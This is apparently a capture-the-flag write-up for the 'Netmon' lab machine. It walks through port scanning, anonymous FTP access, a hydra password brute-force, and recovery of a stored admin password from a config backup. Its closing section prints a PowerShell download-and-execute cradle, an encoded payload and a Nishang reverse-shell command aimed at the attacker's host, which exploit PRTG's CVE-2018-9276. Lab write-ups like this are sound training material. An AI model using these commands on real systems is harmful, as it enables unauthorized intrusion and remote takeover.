# Netmon

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```shell
└─$ export IP=10.10.10.152
└─$ echo $IP
10.10.10.152
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```shell
└─$ ping $IP
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.10.152: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.10.152: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.10.152: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Enumeration

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

``` shell
└─$ nmap -sV -sC -v -oN scan.nmap $IP
```

After the scan is complete, here's the result:

```shell
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: PRTG/18.1.37.13946
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

That's a lot of space to play in.

---

## Web Application

As always, first thing I always do I go check out the website if it exists on port 80, I added it to my `/etc/hosts` as usual and navigated to the web application running on port 80, and I was greeted with the default PRTG Network Manager login page.

![PRTG Network Manager Login Page](https://imgur.com/LyZF79G.png)

I tried several SQL Injections and NoSQL Injections but none of them seemed to work, I didn't want to waste too much time on this since it might just be default credentials, so I googled `PRTG Default Credentials` and I found that `prtgadmin:prtgadmin` is the default login credentials. However they did not work.

I also found a `Forgot Password` feature, and when I tried different usernames on it, it verifies for me if this username exists or not, so I kept trying some random usernames but they did not exist except for `prtgadmin`. That confirms maybe `prtgadmin` is the username that im going after.

```shell
└─$ sudo hydra -l prtgadmin -P /usr/share/ $IP http-post-form "/public/checklogin.htm:username=prtgadmin&password=^PASS^:Your login has failed."
```

```shell
fuzz -c -f subDomainFuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://netmon.htb' -H "Host: FUZZ.netmon.htb" --hw 0
```

I tried bruteforcing passwords using `hydra` with some default passwords but did not work as well, I tried fuzzing some subdomains maybe there's another service running under the hood I can sniff some credentials from, but still, no success. so I decided to move on to another open port on the target machine.

---

## FTP

According to the scan, I had access to the FTP server anonymously with a blank password so I went ahead and tried to connect to the FTP server:

```shell
└─$ ftp ftp://anonymous@$IP
Connected to 10.10.10.152.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.
ftp> ls
229 Entering Extended Passive Mode (|||51203|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> 

```

First thing I did was explore the file system and see if some of the known files had any credentials, like `win.ini`, `C:/WINNT/php.ini` which did not exist, not a php server, `hosts`, and windows update log files but none of them had any sign of useful information, except it was runnig a `Windows Server 2015` that has never been updated.

In the sake of seeking a flag, i navigated to `/Users/Public` and indeed I found `user.txt` and It was the user flag!

```shell
ftp> cd Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||51657|)
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
09-21-22  03:37AM                   34 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
```

I then started searching online on where `PRTG Network Manager` stores config files or even credentials, and I found that the default config files are in `%programdata%\Paessler\PRTG Network Monitor`, I navigated there and found 3 configuration files and downloaded them:

```shell
ftp> ls
229 Entering Extended Passive Mode (|||51417|)
125 Data connection already open; Transfer starting.
12-15-21  08:23AM       <DIR>          Configuration Auto-Backups
09-21-22  03:37AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
09-21-22  03:37AM       <DIR>          Logs (Web Server)
09-21-22  03:42AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
09-21-22  05:00AM              1696772 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp> 
```

I then did an `md5sum` checksum to verify the files are different, and it showed that `PRTG Configuration.dat` and `PRTG Configuration..old` are the same, BUT `PRTG Configuration.old.bak` is different. so I ran a `diff` command to see if anything interesting changed:

```shell
└─$ diff PRTG\ Configuration.old.bak PRTG\ Configuration.dat -y
```

Got nothing really clear out of this command, but I managed to find a hard coded old password in the backup file:

```shell
└─$ cat PRTG\ Configuration.old.bak | grep prtgadmin -A3 -B3                               
              0
            </dbcredentials>
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
--
                  43499.7768071065
                </lastlogin>
                <login>
                  prtgadmin
                </login>
                <name>
                  PRTG System Administrator
```

so `PrTg@dmin2018` must be the password of `prtgadmin`! I tried logging in but it did not work, but I noticed that the password was last modified on `2018`, and it's `PrTg@dmin2018`, so I tried `PrTg@dmin2022` didn't work, I started manually brute forcing all years to see if anything would hit:
```shell
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
```

None of them worked so I reset the machine since the `Forgot password` feature may have reset the password somehow, and `PrTg@dmin2019` worked! makes sense since the last modified date on the current config file is 2019, and I logged into the admin page!

I started reading online seacrching for a public vulnerability for PRTG Network Manager I found [CVE-2018-9276](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9276) which allows code execution through sending a notification. So I started navigating through the application to find where can I send a notification until I found this page:

![Setup Page - Push Notifications](https://imgur.com/xMaNlm5.png)

So I started testing frist by trying to ping my attacker machine using `ping` and listening using `tcpdump`:

![Pinging my Attacker machine on a notification](https://imgur.com/PK79Neh.png)

```shell
└─$ sudo tcpdump -i tun0  
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:36:01.480207 IP 10.10.16.4.43618 > netmon.htb.http: Flags [S], seq 1226001904, win 64240, options [mss 1460,sackOK,TS val 81236168 ecr 0,nop,wscale 7], length 0
08:36:01.614472 IP netmon.htb.http > 10.10.16.4.43618: Flags [S.], seq 623332445, ack 1226001905, win 8192, options [mss 1335,nop,wscale 8,sackOK,TS val 1537111 ecr 81236168], length 0
```

and It works! so I started with getting the payload ready for a reverse shell using [nishang](https://github.com/samratashok/nishang), encoded my payload to base64, started a python http server to send the payload through, started a listener using `Netcat`, and when I ran the command I got the reverse shell and got the Root flag!

```shell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4:8000/payload.ps1')" | iconv --to-code UTF-16LE | base64 -w0 | xclip -selection clipboard

echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444' >> Invoke-PowerShellTcp.ps1
```

```
SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA0AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==
```

![Payload Execution On Notification](https://imgur.com/lywoZtY.png)


```shell
└─$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.152 - - [21/Sep/2022 08:23:48] "GET /payload.ps1 HTTP/1.1" 200 -

```

```shell
└─$ sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.152] 50015
Windows PowerShell running as user NETMON$ on NETMON
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
```

---